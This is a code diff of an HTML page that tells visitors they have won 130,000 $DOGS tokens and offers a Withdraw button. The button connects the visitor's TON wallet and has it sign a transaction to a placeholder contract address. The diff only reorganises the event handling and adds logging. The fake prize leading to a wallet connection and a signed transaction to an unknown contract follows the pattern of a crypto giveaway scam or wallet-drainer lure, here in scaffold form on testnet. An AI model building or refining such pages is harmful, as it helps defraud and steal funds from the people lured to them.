@@ -56,46 +56,51 @@
         <img src="your_image_url_for_dogs_token_logo" alt="$DOGS Token Logo">
         <h1>Congratulations!</h1>
         <p>You have won 130,000 $DOGS Tokens!</p>
-        <button class="button" onclick="connectWallet()">Withdraw</button>
+        <button class="button" id="withdrawButton">Withdraw</button>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@tonconnect/sdk@latest/dist/tonconnect.min.js"></script>
     <script>
-        const tonconnect = new TonConnect({
-            network: 'testnet' // Use 'mainnet' for the main network
+        document.addEventListener('DOMContentLoaded', (event) => {
+            const tonconnect = new TonConnect({
+                network: 'testnet' // Use 'mainnet' for the main network
+            });
+
+            async function connectWallet() {
+                try {
+                    console.log('Attempting to connect wallet...');
+                    const { address, signer } = await tonconnect.connect();
+
+                    console.log('Connected wallet address:', address);
+
+                    // Call the contract
+                    await callContract(address, signer);
+                } catch (error) {
+                    console.error('Failed to connect wallet:', error);
+                }
+            }
+
+            async function callContract(walletAddress, signer) {
+                try {
+                    const contractAddress = "YourContractAddressHere"; // Replace with your contract address
+
+                    const transaction = {
+                        to: contractAddress,
+                        value: '0', // Sending 0 TON to trigger the contract
+                        payload: '' // Optionally add any payload needed for the contract
+                    };
+
+                    console.log('Sending transaction:', transaction);
+                    const tx = await signer.sendTransaction(transaction);
+
+                    console.log('Contract called successfully:', tx);
+                } catch (error) {
+                    console.error('Error calling contract:', error);
+                }
+            }
+
+            document.getElementById('withdrawButton').addEventListener('click', connectWallet);
         });
-
-        async function connectWallet() {
-            try {
-                const { address, signer } = await tonconnect.connect();
-
-                // Now you have the user's wallet address and signer
-                console.log('Connected wallet address:', address);
-
-                // Call the contract
-                await callContract(address, signer);
-            } catch (error) {
-                console.error('Failed to connect wallet:', error);
-            }
-        }
-
-        async function callContract(walletAddress, signer) {
-            try {
-                const contractAddress = "YourContractAddressHere"; // Replace with your contract address
-
-                const transaction = {
-                    to: contractAddress,
-                    value: '0', // Sending 0 TON to trigger the contract
-                    payload: '' // Optionally add any payload needed for the contract
-                };
-
-                const tx = await signer.sendTransaction(transaction);
-
-                console.log('Contract called successfully:', tx);
-            } catch (error) {
-                console.error('Error calling contract:', error);
-            }
-        }
     </script>
 </body>
 </html>
